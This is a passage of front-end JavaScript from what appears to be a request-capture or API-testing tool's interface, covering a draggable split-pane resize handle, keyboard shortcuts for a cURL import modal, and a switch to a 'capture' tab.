      startW   = left.getBoundingClientRect().width;
      handle.classList.add("as-dragging");
      document.body.style.cursor     = "col-resize";
      document.body.style.userSelect = "none";
      e.preventDefault();
    });
    document.addEventListener("mousemove", e => {
      if (!dragging) return;
      const parent = left.parentElement;
      const total  = parent.getBoundingClientRect().width - handle.offsetWidth;
      const newW   = Math.max(180, Math.min(total - 240, startW + (e.clientX - startX)));
      left.style.width = `${newW}px`;
      left.style.flex  = "none";
      right.style.flex = "1";
    });
    document.addEventListener("mouseup", () => {
      if (!dragging) return;
      dragging = false;
      handle.classList.remove("as-dragging");
      document.body.style.cursor = document.body.style.userSelect = "";
    });
  })();

  // cURL modal keyboard shortcuts
  const curlInp = document.getElementById("as-curl-input");
  if (curlInp) {
    curlInp.addEventListener("keydown", e => {
      if (e.ctrlKey && e.key === "Enter") { e.preventDefault(); asConfirmCurl(); }
      if (e.key === "Escape") asCancelCurlModal();
    });
  }

  asSwitchTab("capture");
};
